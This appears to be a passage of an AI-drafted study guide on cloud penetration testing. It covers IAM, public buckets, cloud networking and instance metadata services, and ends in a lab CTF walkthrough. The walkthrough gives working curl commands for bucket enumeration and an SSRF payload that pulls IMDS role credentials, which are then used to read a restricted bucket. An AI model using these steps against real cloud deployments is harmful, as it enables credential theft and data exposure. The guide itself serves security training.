 a single cohesive guide.

---

```markdown
# Cloud Security & Penetration Testing Fundamentals

A comprehensive guide to cloud security assessments, detailing service and deployment models, the Shared Responsibility Model, IAM evaluation, cloud network architecture, instance metadata attacks (IMDS), and an end-to-end practical CTF exploit chain.

---

## 📌 Engagement Orientation

Every cloud engagement starts with a simple question: **What is the customer actually renting, and where does the provider's responsibility stop?** Answer that, and we know where to look for misconfigurations. Service and deployment models are the vocabulary for that conversation.

---

## 🏗️ Service Models

Three abbreviations cover most of what we meet in practice, and we can ground each one with an analogy.

### 1. IaaS (Infrastructure as a Service)
* **Definition:** Renting raw computing hardware. The provider gives us a virtual machine, a virtual disk, and a virtual network, and we install and run everything on top.
* **Analogy:** Renting an empty apartment. The walls and plumbing are there, but everything else is on us.
* **Example:** A cloud virtual machine (e.g., AWS EC2) running our own web stack.

### 2. PaaS (Platform as a Service)
* **Definition:** Renting a managed runtime. The provider handles the operating system, the runtime, and often scaling. We upload our code or data, and it runs.
* **Analogy:** Renting a semi-furnished apartment. The basics are set; you move in and focus on living rather than installing infrastructure.
* **Example:** Azure App Service, AWS Elastic Beanstalk, or Google Cloud App Engine.

### 3. SaaS (Software as a Service)
* **Definition:** Renting a fully managed application. The provider runs everything: infrastructure, platform, and software. We log in through a web interface, configure settings, and use it.
* **Analogy:** Renting a hotel room. Everything is ready to use, and cleaning, maintenance, and all services are handled for you.
* **Example:** Cloud-hosted email or collaboration suites (e.g., Microsoft 365, Google Workspace).

---

## 🌐 Deployment Models

Deployment models describe who else shares the infrastructure:

* **Public Cloud:** Shared infrastructure operated by a provider. Workloads live alongside other customers' workloads, separated by the hypervisor and network controls.
* **Private Cloud:** Infrastructure dedicated to one organization, either run on-premises or hosted.
* **Hybrid Cloud:** A mix of public and on-premises environments connected by a private link or VPN.
* **Community Cloud:** Shared infrastructure between organizations with common requirements (e.g., government or regulated-industry clouds).

---

## 🛡️ The Shared Responsibility Model

Many cloud security incidents happen because customers misunderstand where their responsibility begins and ends.

* **Provider Responsibility:** Physical data centers, hardware, and hypervisor maintenance.
* **Customer Responsibility:** Owning data, user identities, and resource access policies.
* **The Middle Layer (The Attack Surface):** Operating system, runtime environment, and network configuration. This shifts depending on the service model.

### Responsibility Breakdown Matrix

| Layer | IaaS | PaaS | SaaS |
| :--- | :--- | :--- | :--- |
| **Physical Data Center** | Provider | Provider | Provider |
| **Hardware & Hypervisor** | Provider | Provider | Provider |
| **Network Configuration** | Customer | Shared | Provider |
| **Operating System** | Customer | Provider | Provider |
| **Runtime & Middleware** | Customer | Provider | Provider |
| **Application Code** | Customer | Customer | Provider |
| **Data** | Customer | Customer | Customer |
| **Identities & Access** | Customer | Customer | Customer |

> **Attacker Takeaway:** As attackers, we rarely search for hypervisor zero-days on a standard engagement. We look for operational oversights where the customer failed their responsibilities: a virtual machine left with a default password, an exposed storage bucket, or an IAM policy configured with wildcards.

---

## 🔑 Identity & Access Management (IAM)

Identity is where most cloud compromises start. A leaked access key or a role with excessive permissions beats a complex memory-corruption exploit nine times out of ten.

### Policies Are Just Documents
A cloud IAM policy is a JSON document specifying who can do what to which resources. Three fields carry most of the meaning:

1. **Effect:** `Allow` or `Deny`
2. **Action:** Operations covered (e.g., `storage:GetObject`, `iam:CreateUser`)
3. **Resource:** Targeted resource identifier (e.g., `bucket/reports/*`)

#### Example: Well-Scoped Policy
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "storage:GetObject",
      "Resource": "bucket/reports/*"
    }
  ]
}

```

#### Example: Over-Permissive Policy (High Blast Radius)

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}

```

> **Note on Syntax:** The `storage:` prefix is a generic placeholder in this document. Real providers use specific service prefixes (e.g., `s3:` on AWS). The JSON structure shown above reflects AWS syntax, but the evaluation methodology (checking `Effect`, `Action`, and `Resource`) applies across AWS, Azure, and GCP.

---

### Roles and Role Assumption

* **Roles:** A named bundle of permissions that an identity can temporarily assume.
* **Temporary Credentials:** When an identity assumes a role, the cloud provider hands back temporary credentials scoped to that role's policies.

#### Why Attackers Care About Role Assumption:

1. **Privilege Escalation:** A compromised low-privilege user or workload may have rights to assume a higher-privilege role.
2. **Metadata Services:** The Instance Metadata Service (IMDS) issues temporary credentials for roles attached to virtual machines. Extracting these credentials provides immediate access to that role.

---

### The IAM Enumeration Mindset

When landing a set of cloud credentials (from a `.aws/credentials` file, SSRF output, or a compromised app), run through this checklist:

1. Which identity do these credentials belong to?
2. What policies are attached (directly or through groups)?
3. Which roles can this identity assume?
4. Are any policies over-permissive (containing wildcards `*`)?
5. What is the scope of accessible resources (single resource vs. full account)?

---

### High-Risk Pattern: Exposed Keys + Over-Permissive Policies

Access keys leak frequently through common vectors:

* Committed to public repositories.
* Hardcoded inside public container images.
* Left inside unencrypted backup buckets.
* Embedded in screenshot attachments on ticket systems.

**Impact:** Keys are strings; the breach scale is dictated by the permissions behind them. An exposed developer key containing a wildcard action on a primary storage account yields full data exposure.

---

## 🪣 Public Cloud Storage Buckets

Public cloud storage buckets are the single most common source of breach headlines.

### Object Storage Primitives

Object storage uses flat namespaces containing buckets/containers that hold files and metadata.

* **Bucket Policies (IAM-Style):** Primary access rule documents.
* **ACLs (Access Control Lists):** Legacy per-object access controls.
* **Signed URLs:** Time-limited access links that bypass standard authentication requirements.

#### Failure Modes:

* **Bucket Policies:** Setting `"Principal": "*"`.
* **ACLs:** Enabling `"public read"` on sensitive resources.
* **Signed URLs:** Long expiry limits or exposed signing keys.

---

### How Buckets Become Public

1. **Unrestricted Development Defaults:** Temporary public access left enabled when moving to production.
2. **Disabled Global Controls:** Disabling top-level "Block Public Access" switches.
3. **Wildcard Policy Statements:** Broad `Principal` definitions exposing data to the internet.
4. **Exposed Signed URLs:** Long-lived URLs leaked in publicly accessible channels or tickets.

---

### Attacker Discovery Workflow

1. **Target Identification:** Construct candidate names using predictable naming schemes:
* `<company>-backups`
* `<company>-dev`
* `<company>-prod`
* `<company>-assets`


2. **Endpoint Probing:** Send HTTP requests to public provider endpoints.
3. **Listing Bucket Contents:** Issue a `GET` request to public bucket URLs to receive an index of objects.
4. **Data Exfiltration:** Download accessible files directly without credentials.

#### Automation Tooling:

* `s3scanner`
* `cloud_enum`
* Custom `curl` scripts and targeted wordlists.

---

### High-Value Targets in Open Buckets

1. **Backups:** Database dumps (`.sql`), full-disk snapshots, system configurations.
2. **Source Code & Artifacts:** Embedded keys, API endpoints, unreleased code.
3. **Configuration Files:** `.env` files, `credentials.json`, Kubernetes configurations.
4. **System Logs:** Unredacted PII, session tokens, internal IP networks.
5. **Customer Data:** PII tables, financial records, identity documents.

---

## 🔌 Cloud Networking & Perimeter Analysis

Once we know what the target rents from the cloud, the next question is simple: **what is actually reachable, and what can we do once we have a foothold inside?**

### The Building Blocks

* **Virtual Private Cloud (VPC) / Virtual Network:** A private network isolated from other customers' networks with custom IP ranges.
* **Subnets:**
* **Public Subnet:** Has a direct route to an Internet Gateway (IGW) for public access.
* **Private Subnet:** Isolated from direct internet inbound access.


* **Firewall Primitives:**
* **Security Groups (SGs):** Instance-level, stateful firewalls (defaults to implicit deny; allows explicit outbound responses).
* **Network ACLs (NACLs):** Subnet-level, stateless firewalls (requires explicit inbound/outbound allow rules).



---

### Attacker Focus Areas

#### 1. Exposed Ports

The most common misconfiguration is an overly broad Security Group rule allowing `0.0.0.0/0` (the entire internet) on sensitive ports:

* **SSH (22):** Direct access to jump hosts/bastions.
* **Databases:** MySQL (`3306`), PostgreSQL (`5432`), MongoDB (`27017`).
* **Admin Interfaces:** Unauthenticated panels running on ports `8080` or `9000`.
* **Legacy Management:** Exposed RDP (`3389`).

#### 2. Internal Lateral Movement

Unlike well-segmented on-premises networks, cloud internal networks are frequently flat by default. A single compromised frontend instance in a public subnet can often reach:

* Internal databases and caching servers.
* Application backend microservices.
* Internal admin panels.
* Metadata service endpoints.

---

## 💻 Compute & Instance Metadata Services (IMDS)

A virtual machine in the cloud still runs standard OS software. However, the addition of the **Instance Metadata Service (IMDS)** creates a critical link between web application vulnerabilities and full cloud compromise.

### The Instance Metadata Endpoint

Every cloud instance queries a internal, non-routable HTTP endpoint (typically `169.254.169.254`) to obtain runtime parameters, startup scripts, and—most importantly—**temporary IAM role credentials**.

### IMDS Versioning & SSRF Vulnerabilities

* **IMDSv1 (High Security Risk):** Accepts standard HTTP `GET` requests without authentication or custom headers. Highly susceptible to **Server-Side Request Forgery (SSRF)**.
* **IMDSv2 (Mitigated):** Requires a session token generated via a prior HTTP `PUT` request containing a specific header, blocking simple SSRF primitives.

---

### The SSRF-to-Credentials Attack Chain

```
+------------------+         +--------------------+         +-----------------------+
|  Attacker (Web)  | ------> | Vulnerable Web App | ------> |  IMDS (169.254...)    |
| (Crafted Payload)|         |   (Executes SSRF)  |         | (Returns Credentials) |
+------------------+         +--------------------+         +-----------------------+
         |                                                              |
         +<----------------- Exfiltrates IAM Credentials <--------------+

```

1. **Discover SSRF:** Locate an input parameter fetching user-supplied URLs (e.g., `?url=`, webhook testers, image fetchers).
2. **Target IMDS Endpoint:** Supply the metadata path:
`http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
3. **Extract Credentials:** Retrieve the returned JSON containing `AccessKeyId`, `SecretAccessKey`, and `Token`.
4. **Assume Role:** Authenticate to the cloud API externally using the harvested credentials.

---

### Alternative Compute Models

* **Disk Snapshots:** Unencrypted public disk snapshots can be attached to attacker-controlled VMs to extract filesystem data.
* **Serverless (Lambda/Functions):** Each function carries its own IAM execution role and metadata endpoints reachable via code-level SSRF.
* **Containers (ECS/EKS/GKE):** Containerized environments expose task-specific metadata endpoints containing temporary security credentials.

---

## 🚩 Practical CTF Walkthrough: Cloud Exploitation Chain

### Engagement Brief

* **Target Application:** `ImageFetcher` app running on port `8080`.
* **Object Storage:** Running locally on port `9000`.

---

### Walkthrough Steps

#### Step 1: Network Reconnaissance

Identify open services using `nmap`:

```bash
nmap MACHINE_IP

```

* **Output:** Port `8080` (`ImageFetcher` application) and Port `9000` (Object Storage Service).

#### Step 2: Public Bucket Enumeration

Probe the object-storage service on port `9000` without credentials:

```bash
curl http://MACHINE_IP:9000/

```

* **Discovered Buckets:** `dev-assets` and `prod-secrets`.

Enumerate contents of the public `dev-assets` bucket:

```bash
curl http://MACHINE_IP:9000/dev-assets/

```

Retrieve the revealed developer file:

```bash
curl http://MACHINE_IP:9000/dev-assets/dev-notes.txt

```

> **Key Finding:** `dev-notes.txt` reveals an SSRF-vulnerable URL endpoint (`/fetch?url=`) on port `8080` and identifies the attached IAM role name: `web-app-role`.

#### Step 3: SSRF Exploitation Against IMDS

Exploit the `ImageFetcher` application on port `8080` to query the metadata endpoint for the `web-app-role` credentials:

```bash
curl "http://MACHINE_IP:8080/fetch?url=[http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role](http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role)"

```

> **Output:** Extract JSON containing `AccessKeyId` (`AKIATHM1234FAKEKEY0`), `SecretAccessKey`, and `Token`.

#### Step 4: IAM Policy Analysis

Use the acquired `AccessKeyId` to request the role's IAM policy from the administration endpoint:

```bash
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://MACHINE_IP:9000/admin/policy.json

```

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "storage:*",
      "Resource": "bucket/prod-secrets/*"
    }
  ]
}

```

> **Finding:** Over-permissive wildcard policy (`storage:*`) grants complete access to the restricted `prod-secrets` bucket.

#### Step 5: Exfiltrating the Flag

Access the restricted bucket using the authorized role token header:

```bash
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://MACHINE_IP:9000/prod-secrets/flag.txt

```

* **Result:** Successfully retrieved the challenge flag.

---

## ⚡ Technical Summary & Provider Reference Matrix

### The Core Attack Checklist

1. **Shared Responsibility:** Identify customer-managed infrastructure vs. provider-managed controls.
2. **IAM Policies:** Analyze policies for over-permissive wildcard (`*`) statements.
3. **Storage Access:** Scan for publicly listable buckets and exposed storage endpoints.
4. **Network Perimeter:** Identify exposed ports (`0.0.0.0/0`) and flat internal networks.
5. **Metadata Security:** Leverage web vulnerabilities (SSRF) to extract temporary credentials via IMDS.

---

### Cross-Provider Terminology Matrix

| Concept | Amazon Web Services (AWS) | Microsoft Azure | Google Cloud Platform (GCP) |
| --- | --- | --- | --- |
| **IaaS Compute** | EC2 Instance | Azure Virtual Machine | Compute Engine VM |
| **PaaS Database/App** | RDS / Elastic Beanstalk | Azure SQL / App Service | Cloud SQL / App Engine |
| **SaaS Office Suite** | Amazon WorkMail | Microsoft 365 | Google Workspace |
| **Identity Service** | AWS IAM | Microsoft Entra ID | Cloud IAM |
| **Long-Lived Credentials** | Access Key ID + Secret Key | Client ID + Secret / User Login | Service Account Key / User Login |
| **Role Equivalent** | IAM Role | Managed Identity | Service Account |
| **Virtual Network** | VPC | Virtual Network (VNet) | VPC |
| **Subnet Types** | Public / Private Subnet | Subnet | Subnet |
| **Instance Firewall** | Security Group (SG) | Network Security Group (NSG) | Firewall Rule |
| **Subnet Firewall** | Network ACL (NACL) | NSG at Subnet Scope | Firewall Rule (Network Tags) |
| **Metadata Endpoint** | `http://169.254.169.254/latest/meta-data/` | `http://169.254.169.254/metadata/instance?api-version=...` | `http://metadata.google.internal/` |
| **Metadata Header Req.** | Token (IMDSv2) | `Metadata: true` | `Metadata-Flavor: Google` |
| **Serverless Engine** | AWS Lambda | Azure Functions | Cloud Functions / Cloud Run |
| **Managed Containers** | ECS / EKS / Fargate | ACI / AKS | Cloud Run / GKE |
| **Object Storage Service** | Amazon S3 | Azure Blob Storage | Google Cloud Storage |
| **Storage Unit** | Bucket | Container | Bucket |
| **Public URL Format** | `https://<bucket>.s3.amazonaws.com/<key>` | `https://<account>.blob.core.windows.net/<container>/<blob>` | `https://storage.googleapis.com/<bucket>/<object>` |
| **Access Control** | Bucket Policy, IAM Policy, ACL | Shared Access Signature (SAS), RBAC | IAM Policy, ACL, Signed URL |

```

---

<ElicitationsGroup message="Next steps for your cloud security notes:">

  <Elicitation label="Create a Cloud Penetration Testing Command Cheat Sheet" query="Create a practical command-line cheat sheet covering key commands for AWS CLI, Azure CLI, and gcloud CLI used during cloud penetration testing."/>

  <Elicitation label="Build an IAM privilege escalation reference guide" query="Detail the top AWS IAM privilege escalation paths and misconfigurations (such as iam:CreateAccessKey or iam:PassRole) with mitigation steps."/>

</ElicitationsGroup>

```
